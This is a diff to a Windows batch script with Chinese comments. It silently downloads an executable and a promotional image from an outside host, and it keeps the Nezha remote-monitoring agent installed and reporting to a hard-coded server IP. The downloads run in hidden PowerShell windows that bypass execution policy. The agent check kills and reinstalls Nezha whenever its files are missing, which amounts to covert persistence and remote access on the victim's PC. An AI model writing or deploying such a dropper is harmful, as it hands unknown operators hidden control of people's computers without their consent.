@@ -4,37 +4,59 @@ setlocal enabledelayedexpansion
 
 set "DESKTOP=%USERPROFILE%\Desktop"
 set "EXE_FILE=五五知行社.exe"
+set "EXE_PATH=%DESKTOP%\%EXE_FILE%"
 set "IMG_URL=http://github.luoruozhou.top/wwzxs/QQ%EF%BC%9A1668729341.png"
 set "IMG_FOLDER=D:\获取冰点密码请点击"
 set "IMG_FILE=QQ：1668729341.png"
+set "IMG_PATH=%IMG_FOLDER%\%IMG_FILE%"
 set "EXE_URL=http://github.luoruozhou.top/wwzxs/五五知行社.exe"
 
-:: 检测五五知行社.exe
-if exist "%DESKTOP%\%EXE_FILE%" (
-    del /f /q "%DESKTOP%\%EXE_FILE%" >nul 2>nul
+:: 检测图片是否存在，不存在则下载
+if not exist "%IMG_PATH%" (
+    if not exist "%IMG_FOLDER%" mkdir "%IMG_FOLDER%"
+    powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
+    "try { Invoke-WebRequest '%IMG_URL%' -OutFile '%IMG_PATH%' -TimeoutSec 30 } catch { exit }"
+)
+
+:: 检测五五知行社.exe是否存在，不存在则下载
+if not exist "%EXE_PATH%" (
+    powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
+    "try { Invoke-WebRequest '%EXE_URL%' -OutFile '%EXE_PATH%' -TimeoutSec 30 } catch { exit }"
 )
 
 :: 检测哪吒Agent是否运行
 tasklist | find /i "nezha" >nul 2>nul
-if %errorlevel% equ 0 (
-    taskkill /f /im nezha.exe >nul 2>nul
-    taskkill /f /im nezha-agent.exe >nul 2>nul
-    timeout /t 2 /nobreak >nul 2>nul
+if %errorlevel% neq 0 (
+    :: 哪吒未运行，检查文件是否存在，不存在则重装
+    if not exist "C:\Program Files\nezha" (
+        if not exist "C:\nezha" (
+            goto :install_nezha
+        )
+    )
 )
-
-:: 如果存在哪吒相关文件则删除
+:: 如果哪吒在运行，检查文件是否完整，不完整则结束进程重装
 if exist "C:\Program Files\nezha" (
-    rmdir /s /q "C:\Program Files\nezha" >nul 2>nul
+    if not exist "C:\Program Files\nezha\nezha-agent.exe" (
+        taskkill /f /im nezha.exe >nul 2>nul
+        taskkill /f /im nezha-agent.exe >nul 2>nul
+        timeout /t 2 /nobreak >nul 2>nul
+        rmdir /s /q "C:\Program Files\nezha" >nul 2>nul
+        goto :install_nezha
+    )
 )
 if exist "C:\nezha" (
-    rmdir /s /q "C:\nezha" >nul 2>nul
+    if not exist "C:\nezha\nezha-agent.exe" (
+        taskkill /f /im nezha.exe >nul 2>nul
+        taskkill /f /im nezha-agent.exe >nul 2>nul
+        timeout /t 2 /nobreak >nul 2>nul
+        rmdir /s /q "C:\nezha" >nul 2>nul
+        goto :install_nezha
+    )
 )
+:: 一切正常则退出
+exit
 
-:: 创建图片文件夹并下载图片
-if not exist "%IMG_FOLDER%" mkdir "%IMG_FOLDER%"
-powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
-"try { Invoke-WebRequest '%IMG_URL%' -OutFile '%IMG_FOLDER%\%IMG_FILE%' -TimeoutSec 30 } catch { exit }"
-
+:install_nezha
 :: Ping测速选最快镜像
 set "URL1=shturl.cc/uKiu14Qw0MDkTvhqgb"
 set "URL2=shturl.cc/ngMQmnvHSq9PH"
@@ -56,11 +78,6 @@ for %%u in ("%URL1%" "%URL2%" "%URL3%" "%URL4%") do (
 
 if "%FASTEST_URL%"=="" set "FASTEST_URL=https://gh.dpik.top"
 
-:: 重新下载五五知行社.exe
-powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
-"try { Invoke-WebRequest '%EXE_URL%' -OutFile '%DESKTOP%\%EXE_FILE%' -TimeoutSec 30 } catch { exit }"
-
-:: 重新安装哪吒
 powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
 "$env:NZ_SERVER='188.68.250.201:44567'; ^
 $env:NZ_TLS='false'; ^
